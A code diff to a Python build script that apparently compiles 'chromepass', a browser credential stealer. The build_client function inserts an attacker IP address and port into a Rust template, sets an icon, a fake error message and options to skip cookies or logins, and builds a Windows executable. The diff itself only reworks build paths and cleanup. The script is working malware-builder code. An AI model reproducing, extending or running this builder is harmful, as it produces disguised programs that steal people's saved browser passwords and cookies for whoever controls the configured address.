@@ -78,13 +78,11 @@ def create_executable(filename, icon, mode="windowed"):
 def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool=False, error_message="None", nocookies=False, nologin=False, port=80, nobuild=True):
     temp_path = f"{template_dir}/{filename}"
     build_path = f"{template_dir}/{chromepass_base}/src/main.rs"
-    build_command = f"cd {build_dir}\\{chromepass_base}; cargo build --release;"
+    build_command = f"cd {template_dir}\\{chromepass_base}; cargo build --release;"
     if os.path.exists(temp_path) and not nobuild:
         print("[+] Building Client")
-        shutil.copytree(f"{template_dir}/{chromepass_base}",
-                        f"{build_dir}/{chromepass_base}")
         shutil.copyfile(f"{icon_dir}/{icon}",
-                        f"{build_dir}/{chromepass_base}/client.ico")
+                        f"{template_dir}/{chromepass_base}/client.ico")
         with open(temp_path, "r") as f:
             content = f.read()
         content = content.replace("<<IP_ADDRESS>>", ip_address)
@@ -101,7 +99,9 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
         print(build_command)
         if compile_client(build_command):
             shutil.copyfile(
-                f"{build_dir}/{chromepass_base}/target/release/chromepass.exe", f"{dist_dir}/{filename}.exe")
+                f"{template_dir}/{chromepass_base}/target/release/chromepass.exe", f"{dist_dir}/{filename}.exe")
+            os.remove(
+                f"{template_dir}/{chromepass_base}/target/release/chromepass.exe")
             print("[+] Client build Successful")
             return True
     else:
